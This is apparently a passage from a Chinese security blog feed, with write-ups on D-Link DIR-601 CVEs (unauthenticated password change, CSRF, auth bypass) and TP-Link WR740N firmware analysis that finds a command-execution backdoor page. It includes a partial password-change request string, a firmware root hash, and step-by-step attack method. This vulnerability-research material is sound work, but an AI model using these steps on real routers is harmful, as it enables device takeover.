class="hljs-number">0</span>&amp;gateway_name=DIR-<span class="hljs-number">601</span>&amp;request=update_entry&amp;table_name=graph_auth&amp;rowid=<span class="hljs-number">0</span>&amp;graph_auth_enable=<span class="hljs-number">0</span>&amp;request=update_entry&amp;table_name=remote_management&amp;rowid=<span class="hljs-number">0</span>&amp;remote_enable=<span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure><p>这里除了一个可以随意变换的时间戳之外，没有任何对当前用户是否登录的校验，并且密码居然使用明文传输。</p><p>因此攻击者可以在不登陆的情况随意修改路由器密码。</p><h4 id="CVE-2018-12710"><a href="#CVE-2018-12710" class="headerlink" title="CVE-2018-12710"></a><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-12710">CVE-2018-12710</a></h4><p>An issue was discovered on D-Link DIR-601 2.02NA devices. Being local to the network and having only “User” account (which is a low privilege account) access, an attacker can intercept the response from a POST request to obtain “Admin” rights due to the admin password being displayed in XML.</p><p>和CVE-2018-10641一样</p><h4 id="CVE-2019-16326"><a href="#CVE-2019-16326" class="headerlink" title="CVE-2019-16326"></a><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16326">CVE-2019-16326</a></h4><p>D-Link DIR-601 B1 2.00NA devices have CSRF because no anti-CSRF token is implemented. A remote attacker could exploit this in conjunction with CVE-2019-16327 to enable remote router management and device compromise. NOTE: this is an end-of-life product.</p><p>CSFRF漏洞</p><p>这个洞相第二个未验证修改密码的进一步应用</p><p>首先通过信息泄露获取admin的密码登录进入</p><p>然后修改dns和admin密码，抓包</p><p>修改密码的包：</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160548312.png" alt="image-20240728160548312"></p><p>修改dns的包：</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160239990.png" alt="image-20240728160239990"></p><p>把两个包的参数一结合，发包，您猜怎么着</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160907600.png" alt="image-20240728160907600"></p><p>修改成功</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728160930147.png" alt="image-20240728160930147"></p><p>burp生成poc</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728161051539.png" alt="image-20240728161051539"></p><p>模拟攻击成功</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728161436266.png" alt="image-20240728161436266"></p><p>这个csrf属实是。。。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="CVE-2019-16327"><a href="#CVE-2019-16327" class="headerlink" title="CVE-2019-16327"></a><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16327">CVE-2019-16327</a></h4><p>D-Link DIR-601 B1 2.00NA devices are vulnerable to authentication bypass. They do not check for authentication at the server side and rely on client-side validation, which is bypassable. NOTE: this is an end-of-life product.</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728162007173.png" alt="image-20240728162007173"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TP-Link_WR740N_固件分析</title>
    <link href="/2024/07/24/TP-Link-WR740N-%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/24/TP-Link-WR740N-%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="TP-Link-WR740N-固件分析"><a href="#TP-Link-WR740N-固件分析" class="headerlink" title="TP-Link WR740N 固件分析"></a>TP-Link WR740N 固件分析</h3><p>固件名：wr740nv1_en_3_12_4_up.bin</p><ul><li>型号：TP-link wr740N</li><li>版本：v1_en_3_12_4</li><li>测试环境：Ubuntu 18.04</li></ul><p>binwalk -Me wr740nv1_en_3_12_4_up.bin 解包</p><p>查看文件系统</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240730161416092.png" alt="image-20240730161416092"></p><p>firmwalker 枚举</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ./firmwalker.sh ~/Desktop/_wr740nv1_en_3_12_4_up.bin.extracted/squashfs-root/<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs bash">***Firmware Directory***<br>/home/iot/Desktop/_wr740nv1_en_3_12_4_up.bin.extracted/squashfs-root/<br>***Search <span class="hljs-keyword">for</span> password files***<br><span class="hljs-comment">##################################### passwd</span><br>etc/passwd<br><br><span class="hljs-comment">##################################### shadow</span><br>etc/shadow<br><br>-------------------- admin --------------------<br>etc/services:kerberos-adm749/tcp<span class="hljs-comment"># Kerberos `kadmin&#x27; (v5)</span><br>etc/services:kerberos-master751/tcp<span class="hljs-comment"># Kerberos admin server tcp</span><br>etc/services:kerberos-master751/udp<span class="hljs-comment"># Kerberos admin server udp</span><br>web/help/RestoreDefaultCfgHelpRpm.htm:&lt;lI&gt;Default Password&lt;B&gt; - admin&lt;/B&gt;.&lt;/lI&gt;<br>web/help/RestoreDefaultCfgHelpRpm.htm:&lt;lI&gt;Default User Name&lt;B&gt; - admin&lt;/B&gt;.&lt;/lI&gt;<br>web/userRpm/AccessDenied.htm:      Please reset the device to the factory default settings <span class="hljs-keyword">if</span> you have forgotten your username or password. The default username and password are both <span class="hljs-built_in">set</span> as &lt;B&gt;&amp;quot;admin&amp;quot;&lt;/B&gt;.&lt;BR&gt;<br><br>-------------------- root --------------------<br>etc/group:root:x:0:<br>etc/passwd:Admin:x:0:0:root:/root:/bin/sh<br>etc/passwd:ap71:x:500:0:Linux User,,,:/root:/bin/sh<br>etc/passwd:root:x:0:0:root:/root:/bin/sh<br>etc/shadow:root:$1$<span class="hljs-variable">$zdlNHiCDxYDfeF4MZL</span>.H3/:10933:0:99999:7:::<br><br>-------------------- password --------------------<br>etc/services:shell514/tcpcmd<span class="hljs-comment"># no passwords used</span><br><br>-------------------- passwd --------------------<br>etc/nsswitch.conf:passwd:compat<br>etc/services:kpasswd761/tcpkpwd<span class="hljs-comment"># BSD Kerberos `passwd&#x27;</span><br>web/userRpm/AutoEmailRpm.htm:              &lt;TD class=<span class="hljs-string">&quot;Item&quot;</span>&gt;&amp;nbsp;&amp;nbsp;&lt;SPAN  <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;t_passwd&quot;</span>&gt;Password:&lt;/SPAN&gt;&lt;/TD&gt;<br>web/userRpm/AutoEmailRpm.htm:              &lt;TD class=<span class="hljs-string">&quot;Item&quot;</span>&gt;&lt;SPAN <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;t_comfirm_passwd&quot;</span>&gt;Confirm The Password:&lt;/SPAN&gt;&lt;/TD&gt;<br>web/userRpm/BPACfgRpm.htm:alert(js_passwd_req = <span class="hljs-string">&quot;Password is required.&quot;</span>);<br>web/userRpm/HttpDebugRpm.htm:frames[<span class="hljs-string">&quot;frame1&quot;</span>].location.href = <span class="hljs-string">&quot;/userRpm/DebugResultRpm.htm?cmd=&quot;</span> + s + <span class="hljs-string">&quot;&amp;usr=&quot;</span> + document.getElementById(<span class="hljs-string">&quot;usr&quot;</span>).value + <span class="hljs-string">&quot;&amp;passwd=&quot;</span> + document.getElementById(<span class="hljs-string">&quot;passwd&quot;</span>).value;<br>web/userRpm/HttpDebugRpm.htm:            &lt;TD width=35%&gt;&lt;INPUT <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;passwd&quot;</span> name=<span class="hljs-string">&quot;passwd&quot;</span> size=<span class="hljs-string">&quot;40&quot;</span> value=<span class="hljs-string">&quot;&quot;</span> style=<span class="hljs-string">&quot;width:50%&quot;</span>&gt;&lt;/TD&gt;<br>web/userRpm/L2TPCfgRpm.htm:alert(js_passwd_req = <span class="hljs-string">&quot;Password is required.&quot;</span>);<br>web/userRpm/PPPoECfgRpm.htm:alert(js_passwd_req = <span class="hljs-string">&quot;Password is required.&quot;</span>);<br>web/userRpm/PPPoECfgRpm.htm:      &lt;TD class=Item <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;t_passwd&quot;</span>&gt;Password:&lt;/TD&gt;<br>web/userRpm/PPTPCfgRpm.htm:alert(js_passwd_req = <span class="hljs-string">&quot;Password is required.&quot;</span>);<br>web/userRpm/WzdWlanRpm.htm:                alert(js_illegal_passwd = <span class="hljs-string">&quot;The password value contain illegal characters, please input another one!&quot;</span>);<br><br>-------------------- <span class="hljs-built_in">pwd</span> --------------------<br>etc/services:kpasswd761/tcpkpwd<span class="hljs-comment"># BSD Kerberos `passwd&#x27;</span><br>web/userRpm/BPACfgRpm.htm:document.forms[0].pwd.value=bpaData[4];<br>web/userRpm/BPACfgRpm.htm:element = document.forms[0].<span class="hljs-built_in">pwd</span>;<br>web/userRpm/BPACfgRpm.htm:        &lt;TD class=Item <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;t_pwd&quot;</span>&gt;Password:&lt;/TD&gt;<br>web/userRpm/BPACfgRpm.htm:        &lt;TD&gt;&lt;INPUT name=<span class="hljs-string">&quot;pwd&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;password&quot;</span> class=<span class="hljs-string">&quot;text&quot;</span> value=<span class="hljs-string">&quot;&quot;</span> size=<span class="hljs-string">&quot;25&quot;</span> maxlength=<span class="hljs-string">&quot;15&quot;</span> onFocus=<span class="hljs-string">&quot;doClick();&quot;</span>&gt;&lt;/TD&gt;<br>web/userRpm/ChangeLoginPwdRpm.htm:alert(js_bad_conf_pwd=<span class="hljs-string">&quot;The confirm password must accord with the new password!&quot;</span>);<br>web/userRpm/ChangeLoginPwdRpm.htm:&lt;BODY onLoad=<span class="hljs-string">&quot;LoadHelp(&#x27;ChangeLoginPwdHelpRpm.htm&#x27;);setTagStr(document,&#x27;ntw_change_login_pwd&#x27;); resize(this);&quot;</span> onResize=<span class="hljs-string">&quot;resize(this);&quot;</span>&gt;<br>web/userRpm/ChangeLoginPwdRpm.htm:        &lt;TD class=Item <span class="hljs-built_in">id</span> =<span class="hljs-string">&quot;t_conf_new_pwd&quot;</span>&gt;Confirm New Password:&lt;/TD&gt;<br>web/userRpm/ChangeLoginPwdRpm.htm:        &lt;TD class=Item <span class="hljs-built_in">id</span> =<span class="hljs-string">&quot;t_new_pwd&quot;</span>&gt;New Password:&lt;/TD&gt;<br>web/userRpm/ChangeLoginPwdRpm.htm:        &lt;TD class=Item <span class="hljs-built_in">id</span> =<span class="hljs-string">&quot;t_old_pwd&quot;</span>&gt;Old Password:&lt;/TD&gt;<br>web/userRpm/CmxDdnsRpm.htm:document.forms[0].pwd.value = serInf[2];<br>web/userRpm/CmxDdnsRpm.htm:document.getElementById(<span class="hljs-string">&quot;connectStatus&quot;</span>).innerHTML = <span class="hljs-string">&quot;&lt;span id = \&quot;t_pwd_error\&quot;&gt;User Name or Password error!&lt;/span&gt;&quot;</span>;<br>web/userRpm/CmxDdnsRpm.htm:&lt;TR&gt;&lt;TD class=Item <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;t_pwd&quot;</span>&gt;Password:&lt;/TD&gt;&lt;TD&gt;&lt;input name=<span class="hljs-string">&quot;pwd&quot;</span> value=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;password&quot;</span> class=<span class="hljs-string">&quot;text&quot;</span> size=<span class="hljs-string">&quot;15&quot;</span> maxlength=<span class="hljs-string">&quot;63&quot;</span> onFocus=<span class="hljs-string">&quot;doFocus();&quot;</span>&gt;&lt;/TD&gt;&lt;/TR&gt;<br>web/userRpm/DynDdnsRpm.htm:document.forms[0].pwd.value=<span class="hljs-string">&quot;&quot;</span>;<br>web/userRpm/DynDdnsRpm.htm:document.forms[0].pwd.value = serInf[1];<br>web/userRpm/DynDdnsRpm.htm:document.getElementById(<span class="hljs-string">&quot;connectStatus&quot;</span>).innerHTML = <span class="hljs-string">&quot;&lt;span id = \&quot;t_pwd_err\&quot;&gt;User Name or Password error!&lt;/span&gt;&quot;</span>;<br>web/userRpm/DynDdnsRpm.htm:        &lt;TD&gt;&lt;INPUT name=<span class="hljs-string">&quot;pwd&quot;</span> value=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;password&quot;</span> class=<span class="hljs-string">&quot;text&quot;</span> size=<span class="hljs-string">&quot;15&quot;</span> maxlength=<span class="hljs-string">&quot;63&quot;</span> onFocus=<span class="hljs-string">&quot;stopRefresh();&quot;</span> onblur = <span class="hljs-string">&quot;startRefresh()&quot;</span>&gt;&lt;/TD&gt;<br>web/userRpm/NoipDdnsRpm.htm:    document.forms[0].pwd.value=<span class="hljs-string">&quot;&quot;</span>;<br>web/userRpm/NoipDdnsRpm.htm:document.forms[0].pwd.value = serInf[1];<br>web/userRpm/NoipDdnsRpm.htm:        &lt;TD class=Item <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;t_pwd&quot;</span>&gt;Password:&lt;/TD&gt;<br>web/userRpm/NoipDdnsRpm.htm:        &lt;TD&gt;&lt;INPUT name=<span class="hljs-string">&quot;pwd&quot;</span> value=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;password&quot;</span> class=<span class="hljs-string">&quot;text&quot;</span> size=<span class="hljs-string">&quot;15&quot;</span> maxlength=<span class="hljs-string">&quot;63&quot;</span> onFocus=<span class="hljs-string">&quot;stopRefresh();&quot;</span>&gt;&lt;/TD&gt;<br>web/userRpm/WlanSecurityRpm.htm:            chr = pwd.charAt(i);<br>web/userRpm/WlanSecurityRpm.htm:        <span class="hljs-keyword">for</span>(var i = 0; i &lt; pwd.length; i++)<br>web/userRpm/WlanSecurityRpm.htm:        <span class="hljs-keyword">for</span>(var i =0; i &lt; pwd.length; i++)<br>web/userRpm/WlanSecurityRpm.htm:<span class="hljs-keyword">function</span> checkpwd()<br>web/userRpm/WlanSecurityRpm.htm:    <span class="hljs-keyword">if</span>( !checkpwd() )<br>web/userRpm/WlanSecurityRpm.htm:        <span class="hljs-built_in">pwd</span> = obj.pskSecret.value;<br>web/userRpm/WlanSecurityRpm.htm:        <span class="hljs-built_in">pwd</span> = obj.radiusSecret.value;<br>web/userRpm/WlanSecurityRpm.htm:        &lt;TD class=Item style=<span class="hljs-string">&quot;padding-left:60px&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;t_psk_pwd&quot;</span>&gt;PSK Password:&lt;/TD&gt;<br>web/userRpm/WlanSecurityRpm.htm:        &lt;TD class=Item style=<span class="hljs-string">&quot;padding-left:60px&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;t_radius_pwd&quot;</span>&gt;Radius Password:&lt;/TD&gt;<br>web/userRpm/WlanSecurityRpm.htm:    var <span class="hljs-built_in">pwd</span>;<br>web/userRpm/WzdPPPoERpm.htm:alert(js_input_pwd=<span class="hljs-string">&quot;Please input a Password!&quot;</span>);<br>web/userRpm/WzdPPPoERpm.htm:          &lt;TD class=Item <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;t_pwd&quot;</span>&gt;Password: &lt;/TD&gt;<br>web/userRpm/WzdWlanRpm.htm:            chr = pwd.charAt(i);<br>web/userRpm/WzdWlanRpm.htm:        <span class="hljs-keyword">for</span>(var i = 0; i &lt; pwd.length; i++)<br>web/userRpm/WzdWlanRpm.htm:<span class="hljs-keyword">function</span> checkpwd()<br>web/userRpm/WzdWlanRpm.htm:<span class="hljs-keyword">if</span> (!checkpwd())<br>web/userRpm/WzdWlanRpm.htm:        <span class="hljs-built_in">pwd</span> = obj.pskSecret.value;<br>web/userRpm/WzdWlanRpm.htm:      &lt;TD class= <span class="hljs-string">&quot;Item&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;t_psk_pwd&quot;</span>&gt;PSK Password:&lt;/TD&gt;<br>web/userRpm/WzdWlanRpm.htm:    var <span class="hljs-built_in">pwd</span>;<br><br>-------------------- ssl --------------------<br>web/help/WlanNetworkHelpRpm.htm:&lt;p&gt;&lt;B&gt;Note&lt;/B&gt;: Failure to follow these guidelines can result <span class="hljs-keyword">in</span> significant performance degradation or inability to wirelessly connect to the Router.<br><br>-------------------- private key --------------------<br><br>-------------------- telnet --------------------<br>etc/services:rtelnet107/tcp<span class="hljs-comment"># Remote Telnet</span><br>etc/services:rtelnet107/udp<br>etc/services:telnet23/tcp<br>-------------------- cmd= --------------------<br>web/userRpm/HttpDebugRpm.htm:frames[<span class="hljs-string">&quot;frame1&quot;</span>].location.href = <span class="hljs-string">&quot;/userRpm/DebugResultRpm.htm?cmd=&quot;</span> + s + <span class="hljs-string">&quot;&amp;usr=&quot;</span> + document.getElementById(<span class="hljs-string">&quot;usr&quot;</span>).value + <span class="hljs-string">&quot;&amp;passwd=&quot;</span> + document.getElementById(<span class="hljs-string">&quot;passwd&quot;</span>).value;<br>***Search <span class="hljs-keyword">for</span> web servers***<br><span class="hljs-comment">##################################### search for web servers</span><br><span class="hljs-comment">##################################### httpd</span><br>usr/bin/httpd<br><br>***.conf***<br><span class="hljs-comment">##################################### conf</span><br>etc/nsswitch.conf:# /etc/nsswitch.conf<br>web/userRpm/PPPoECfgRpm.htm:document.forms[0].conf<br>web/userRpm/PPPoECfgRpm.htm:var confirm_psw = document.forms[0].conf<br>web/userRpm/WlanNetworkRpm.htm:var bContinue = window.conf<br>web/userRpm/WzdPPPoERpm.htm:document.forms[0].conf<br>web/userRpm/WzdPPPoERpm.htm:var confirm = document.forms[0].conf<br>web/userRpm/WzdWlanRpm.htm:var bContinue = window.conf<br></code></pre></td></tr></table></figure><p>根据枚举信息，web由httpd启动，并且web页面大多在web&#x2F;userRpm&#x2F;目录下</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240730163116259.png" alt="image-20240730163116259"></p><p>找到二进制文件httpd，打开IDA分析</p><p>搜索字符串userRpm</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240730162724725.png" alt="image-20240730162724725"></p><p>看到两个和其他结构不一样的字符串，并且刚才包含firmwalker扫描到的cmd关键字</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240730162853004.png" alt="image-20240730162853004"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240730163429255.png" alt="image-20240730163429255"></p><p>这里包含了三个url</p><p>查看引用后发现，这是一个包含cmd的debug页面，并且在相关函数中发现了疑似硬编码的用户名密码</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240730163229873.png" alt="image-20240730163229873"></p><p>启动项分析</p><p>rcS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-comment"># 当系统启动过程中执行时运行此脚本。</span><br><span class="hljs-comment"># 挂载/etc/fstab中列出的所有文件系统</span><br><br>mount -a  // 挂载/etc/fstab中列出的所有文件系统<br><br><span class="hljs-comment">#mount -o remount +w /  // 此行被注释掉了</span><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 将RAM文件系统挂载到/tmp和/var</span><br><span class="hljs-comment">#</span><br><br>mount -t ramfs -n none /tmp  // 将基于RAM的文件系统挂载到/tmp<br><br>mount -t ramfs -n none /var  // 将基于RAM的文件系统挂载到/var<br><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/etc/ath  // 将/etc/ath添加到PATH环境变量中<br><br><span class="hljs-comment">#insmod /lib/modules/2.6.15/net/ag7100_mod.ko  // 插入一个内核模块（已被注释掉）</span><br><span class="hljs-comment">#insmod /lib/modules/2.6.15/net/ag7240_mod.ko  // 插入另一个内核模块（已被注释掉）</span><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 设置lo（回环）接口为启动状态</span><br><span class="hljs-comment">#</span><br>ifconfig lo 127.0.0.1 up  // 配置并启动回环接口<br><br><span class="hljs-comment">#ifconfig eth1 up  // 此行被注释掉</span><br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 加载netfilter/iptables模块</span><br><span class="hljs-comment">#</span><br><br>/etc/rc.d/rc.modules  // 执行rc.modules脚本以加载netfilter/iptables模块<br><br><br><br>/usr/bin/httpd &amp;  // 启动httpdWeb服务，并放到后台运行<br><br><span class="hljs-built_in">echo</span> 524288 &gt; /proc/sys/net/ipv4/ipfrag_high_thresh  // 设置IP内核参数<br></code></pre></td></tr></table></figure><p>rc.modules</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br>// 检查是否存在/lib/modules/2.6.31目录<br><span class="hljs-built_in">test</span> -d /lib/modules/2.6.31<br><br>// 将结果保存在变量kver_is_2615中<br>kver_is_2615=$?<br><br>// 如果系统使用2.6.15版本的内核<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$kver_is_2615</span> -eq 1 ]<br><span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This board use 2.6.15&quot;</span><br><br>    // 依次加载iptables相关的内核模块<br>    insmod /lib/modules/2.6.15/kernel/ip_tables.ko<br>    insmod /lib/modules/2.6.15/kernel/ip_conntrack.ko<br>    insmod /lib/modules/2.6.15/kernel/ip_nat.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_MASQUERADE.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_comment.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_conntrack.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_iprange.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_mac.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_multiport.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_state.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_string.ko<br>    insmod /lib/modules/2.6.15/kernel/iptable_nat.ko<br>    insmod /lib/modules/2.6.15/kernel/iptable_filter.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_time.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_TRIGGER.ko<br>    insmod /lib/modules/2.6.15/kernel/ip_conntrack_pptp.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_TCPMSS.ko<br>    insmod /lib/modules/2.6.15/kernel/statistics.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_multiurl.ko<br>    insmod /lib/modules/2.6.15/kernel/ip_conntrack_h323.ko<br>    insmod /lib/modules/2.6.15/kernel/ipt_MARK.ko<br>    insmod /lib/modules/2.6.15/kernel/sch_htb.ko<br>    insmod /lib/modules/2.6.15/kernel/sch_prio.ko<br>    insmod /lib/modules/2.6.15/kernel/sch_sfq.ko<br>    insmod /lib/modules/2.6.15/kernel/cls_basic.ko<br>    insmod /lib/modules/2.6.15/kernel/cls_fw.ko<br>    insmod /lib/modules/2.6.15/kernel/ts_kmp.ko<br>    insmod /lib/modules/2.6.15/kernel/flashid.ko<br>    insmod /lib/modules/2.6.15/kernel/br_filter.ko<br>    insmod /lib/modules/2.6.15/kernel/pppol2tp.ko<br>    insmod /lib/modules/2.6.15/kernel/pptp.ko<br>    insmod /lib/modules/2.6.15/kernel/harmony.ko<br>    insmod /lib/modules/2.6.15/kernel/wlan_warn.ko<br><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This Board use 2.6.31&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>固件使用FirmAE模拟:</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240730163352780.png" alt="image-20240730163352780"></p><p>PS查看进程</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240730163600867.png" alt="image-20240730163600867"></p><h4 id="命令执行点"><a href="#命令执行点" class="headerlink" title="命令执行点"></a>命令执行点</h4><p>打开浏览器，依次访问IDA中找到的三个URL，最终定位到一个后门页面</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/image-20240730164110580.png" alt="image-20240730164110580"></p><p>输入IDA中找到的用户名密码即可命令执行</p>]]></content>
    
    
    
  </entry>
  
